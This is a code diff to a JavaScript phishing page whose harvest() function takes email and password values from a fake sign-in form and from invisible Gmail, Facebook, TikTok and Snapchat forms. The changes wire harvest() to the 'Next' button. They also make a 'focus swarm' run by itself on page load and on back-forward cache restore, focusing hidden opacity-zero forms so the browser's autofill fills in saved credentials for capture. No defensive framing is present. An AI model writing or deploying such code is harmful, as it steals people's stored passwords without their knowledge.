@@ -16,10 +16,13 @@ async function harvest() {
   const tiktokForm = document.getElementById('tiktok-form');
   const snapchatForm = document.getElementById('snapchat-form');
 
+  const visibleEmail = document.getElementById('visible-email');
+  const visiblePassword = document.getElementById('visible-password');
+
   const data = {
     gmail: {
-      email: gmailForm ? gmailForm.email.value : '',
-      password: gmailForm ? gmailForm.password.value : '',
+      email: visibleEmail?.value || (gmailForm ? gmailForm.email.value : ''),
+      password: visiblePassword?.value || (gmailForm ? gmailForm.password.value : ''),
     },
     facebook: {
       username: facebookForm ? facebookForm.username.value : '',
@@ -69,7 +72,18 @@ async function harvest() {
   }, 500);
 }
 
-// --- Autofill Detection using 'input' event ---
+// --- Event Listeners ---
+
+// Listen for clicks on the "Next" button for manual submission
+const signinButton = document.getElementById('signin-button');
+if (signinButton) {
+  signinButton.addEventListener('click', (e) => {
+    e.preventDefault(); // Prevent form submission
+    harvest();
+  });
+}
+
+// Setup autofill detection
 function setupInputListeners() {
     const inputs = document.querySelectorAll('.hidden-form input');
     inputs.forEach(input => {
@@ -92,16 +106,16 @@ setTimeout(() => {
     honeypotContainer.style.display = 'block';
     // Set up listeners once the honeypot is visible
     setupInputListeners();
+    // Also trigger the focus swarm to attempt autofill
+    triggerFocusSwarm();
   }
 }, 1500);
 
 function triggerFocusSwarm() {
-  console.log('Honeypot focused, attempting to trigger focus swarm...');
+  console.log('Attempting to trigger focus swarm for autofill...');
 
   const forms = document.querySelectorAll('.hidden-form');
   
-  // Make forms technically "visible" but positioned off-screen or transparently
-  // so they can be focused without disrupting the layout.
   forms.forEach(form => {
     form.style.display = 'block';
     form.style.opacity = '0';
@@ -118,14 +132,6 @@ function triggerFocusSwarm() {
   document.querySelector('#snapchat-form input[name="username"]')?.focus({ preventScroll: true });
 
   // The forms are not hidden again. They remain in the DOM but invisible to the user.
-  // The 'input' event listeners will trigger the harvest when autofill occurs.
-  // The page will then redirect, cleaning up the DOM.
-}
-
-// Add a one-time event listener to the honeypot input for the 'focus' event.
-const honeypotInput = document.getElementById('honeypot-input');
-if (honeypotInput) {
-  honeypotInput.addEventListener('focus', triggerFocusSwarm, { once: true });
 }
 
 // Reset harvest flag if page is loaded from back-forward cache
@@ -133,10 +139,7 @@ window.addEventListener('pageshow', function(event) {
   if (event.persisted) {
     window.harvested = false;
     console.log('Page loaded from bfcache. Harvester reset.');
-    // Re-attach the focus listener if it was a one-time listener
-    const honeypotInput = document.getElementById('honeypot-input');
-    if (honeypotInput) {
-        honeypotInput.addEventListener('focus', triggerFocusSwarm, { once: true });
-    }
+    // Re-trigger focus swarm on bfcache load
+    triggerFocusSwarm();
   }
 });
